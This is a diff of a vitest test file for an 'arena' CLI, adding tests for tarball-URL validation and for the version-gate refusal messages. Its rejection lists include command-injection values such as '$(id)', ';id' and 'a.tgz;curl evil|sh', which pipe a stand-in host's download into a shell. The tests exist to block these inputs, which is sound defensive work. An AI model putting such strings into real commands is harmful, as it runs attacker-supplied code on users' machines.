@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { cliPackage, cliVersion, compareSemver, hostCliVerdict, isNpmPackageName, selfCommand } from "../src/version.js";
+import { cliPackage, cliVersion, commandFor, compareSemver, hostCliVerdict, isNpmPackageName, isTarballUrl, selfCommand, tarballCommand } from "../src/version.js";
 import { runCli } from "../src/cli.js";
 
 describe("version", () => {
@@ -23,12 +23,79 @@ describe("version", () => {
       expect(out).toEqual([cliVersion()]);
     }
   });
+  it("remote agents: arena --help, -h and help print the usage on stdout and exit 0", async () => {
+    for (const argv of [["--help"], ["-h"], ["help"]]) {
+      const out: string[] = [];
+      const err: string[] = [];
+      const code = await runCli(argv, { env: {}, fetch, out: (s) => out.push(s), err: (s) => err.push(s) });
+      expect(code, argv[0]).toBe(0);
+      expect(out.join("\n")).toMatch(/^usage: arena <command> \[options\]\n  init --server URL/);
+      expect(err).toEqual([]);
+    }
+  });
   it("Plan 5.6 Task 4 (ruling 3): selfCommand() is the bare word \"arena\" under tsx (no __ARENA_CLI_PACKAGE__ define)", () => {
     expect(selfCommand()).toBe("arena");
   });
 
   it("Final fix wave (C1): cliPackage() is undefined under tsx -- only the bundle defines it", () => {
     expect(cliPackage()).toBeUndefined();
+  });
+
+  describe("remote agents: a CLI a host serves as a tarball", () => {
+    const URL = "http://100.70.62.92:8700/cli/arena-cli-0.1.0-0123456789abcdef.tgz";
+
+    it("selfCommand's choice: the tarball when one is baked in, else the npm pin, else the bare word", () => {
+      expect(commandFor({ package: "@arena/cli", version: "0.1.0", tarballUrl: URL })).toBe(`npx -y --prefer-offline --package=${URL} arena`);
+      expect(commandFor({ package: "@arena/cli", version: "0.1.0", tarballUrl: undefined })).toBe("npx -y @arena/cli@0.1.0");
+      expect(commandFor({ package: undefined, version: "0.1.0", tarballUrl: undefined })).toBe("arena");
+      expect(tarballCommand(URL)).toBe(`npx -y --prefer-offline --package=${URL} arena`);
+    });
+
+    it("isTarballUrl takes a plain http(s) .tgz URL and nothing a shell would act on", () => {
+      for (const ok of [URL, "https://arena.example/cli/a.tgz", "http://127.0.0.1:8090/cli/arena-cli-0.1.0-ab.tgz"]) expect(isTarballUrl(ok), ok).toBe(true);
+      for (const bad of [
+        "http://u:p@h/cli/a.tgz",
+        "http://h/cli/a.tgz?x=1",
+        "http://h/cli/a.tgz#x",
+        "http://h/cli/a b.tgz",
+        "http://h/cli/$(id).tgz",
+        "http://h/cli/a.tgz;id",
+        "http://h/cli/a.tar",
+        "file:///tmp/a.tgz",
+        "ftp://h/a.tgz",
+        42,
+        undefined,
+      ]) {
+        expect(isTarballUrl(bad), String(bad)).toBe(false);
+      }
+    });
+
+    it("a tarball build (own package @arena/cli) accepts a host pinning @arena/cli at its own version, as before", () => {
+      const tarball = { url: URL, sha256: "a".repeat(64) };
+      expect(hostCliVerdict({ package: "@arena/cli", version: "0.1.0" }, { ownPackage: "@arena/cli", current: "0.1.0", server: "http://100.70.62.92:8700", tarball })).toEqual({});
+      // Another package is still refused, tarball or not.
+      expect(hostCliVerdict({ package: "arena-cli-next", version: "0.1.0" }, { ownPackage: "@arena/cli", current: "0.1.0", server: "http://h", tarball })).toEqual({
+        refusal: "this server pins a different CLI package (arena-cli-next); refusing: this CLI is @arena/cli. Ask your human",
+      });
+    });
+
+    it("below the host's version, the refusal names the host's tarball command, never the unpublished npm package", () => {
+      const v = hostCliVerdict(
+        { package: "@arena/cli", version: "0.2.0" },
+        { ownPackage: "@arena/cli", current: "0.1.0", server: "http://100.70.62.92:8700", tarball: { url: URL } },
+      );
+      expect(v).toEqual({
+        refusal: `this host requires arena CLI version 0.2.0 or newer (you are running 0.1.0): install and run it with: npx -y --prefer-offline --package=${URL} arena init --server http://100.70.62.92:8700`,
+      });
+      expect(JSON.stringify(v)).not.toContain("@arena/cli@");
+    });
+
+    it("a tarball URL that is not plain is never echoed: the refusal points at skill.md's step 0 instead", () => {
+      for (const url of ["http://h/cli/a.tgz;curl evil|sh", "http://h/$(curl evil).tgz", 42, undefined]) {
+        const v = hostCliVerdict({ package: "@arena/cli", version: "0.2.0" }, { ownPackage: "@arena/cli", current: "0.1.0", server: "http://h", tarball: { url } });
+        expect(v, String(url)).toEqual({ refusal: "this host requires arena CLI version 0.2.0 or newer (you are running 0.1.0): install it as step 0 of this host's skill.md says" });
+      }
+    });
   });
 
   describe("Final fix wave (C1): hostCliVerdict, the init version gate", () => {
